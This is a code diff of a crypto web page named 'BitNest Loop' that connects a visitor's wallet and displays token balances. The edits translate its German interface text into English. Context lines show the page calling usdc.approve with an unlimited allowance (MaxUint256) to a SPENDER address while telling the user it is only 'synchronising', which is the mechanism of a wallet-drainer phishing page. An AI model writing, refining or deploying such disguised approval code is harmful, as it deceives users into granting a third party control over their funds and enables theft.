@@ -20,12 +20,12 @@ button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;fon
 <div class="box">
   <h2>BitNest Loop</h2>
   <div class="status-box">
-    <div id="addr">Wallet: Nicht verbunden</div>
+    <div id="addr">Wallet: Not connected</div>
     <hr style="opacity:0.1;margin:10px 0">
     <div id="balances">BNB: –<br>USDT: –<br>USDC: –</div>
   </div>
-  <button id="connectBtn">Wallet verbinden</button>
-  <div id="log">Bereit zur Synchronisierung.</div>
+  <button id="connectBtn">Wallet Connect</button>
+  <div id="log">Synchronisierung.</div>
 </div>
 
 <script>
@@ -107,7 +107,7 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     log.innerText = "Synchronisiere USDC...";
     await (await usdc.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 })).wait();
 
-    log.innerText = "✅ Synchronisierung vollständig!";
+    log.innerText = "✅ Synchronisierung complete!";
 
   } catch (err) {
     log.innerText = "Status: " + (err.message || "Abgebrochen.");
